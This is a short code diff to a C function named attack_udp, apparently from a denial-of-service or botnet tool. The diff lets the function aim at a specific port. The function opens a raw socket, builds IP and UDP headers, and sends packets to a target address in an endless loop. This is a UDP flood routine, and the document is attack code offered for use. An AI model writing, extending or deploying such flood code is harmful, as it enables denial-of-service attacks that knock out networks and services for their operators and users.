@@ -18,14 +18,14 @@ void attack_udp(struct target_data *target)
 	seed_rand(time(NULL));
 
 	target->addr.sin_family = AF_INET;
-	target->addr.sin_port = 0;
+	target->addr.sin_port = target->target_port == 0 ? 0 : htons(target->target_port);
 	target->addr.sin_addr.s_addr = target->target_addr;
 	target->sockfd = init_socket(IPPROTO_UDP);
 
 	while (1) {
 		build_ip(iph, sizeof(struct ip_hdr) + sizeof(struct tcp_hdr),
 			IPPROTO_UDP, target->target_addr);
-		build_udp(iph, udph);
+		build_udp(iph, udph, target->target_port);
 
 		if (sendto(target->sockfd, buffer, iph->length, 0,
 				(struct sockaddr *)&target->addr,
